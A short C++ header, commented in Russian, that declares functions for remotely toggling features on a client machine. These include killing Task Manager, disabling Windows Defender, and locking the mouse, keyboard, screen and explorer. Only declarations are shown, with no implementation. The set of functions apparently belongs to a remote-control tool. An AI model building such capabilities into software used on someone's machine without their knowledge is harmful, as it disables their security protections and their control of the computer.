#pragma once

#include <string>

// Вкладка «Прочее»: системные тумблеры машины-клиента.
bool miscKillTaskmgr(std::string& err);
// func: taskmgr | defender | mouse | clock | screen | keyboard | explorer
// on:   true — включить ограничение/отключить функцию, false — вернуть обратно.
bool miscApply(const std::string& func, bool on, std::string& err);

// JSON-объект текущего состояния из памяти клиента:
//   {"taskmgr":false,"defender":false,...}
std::string miscStateJson();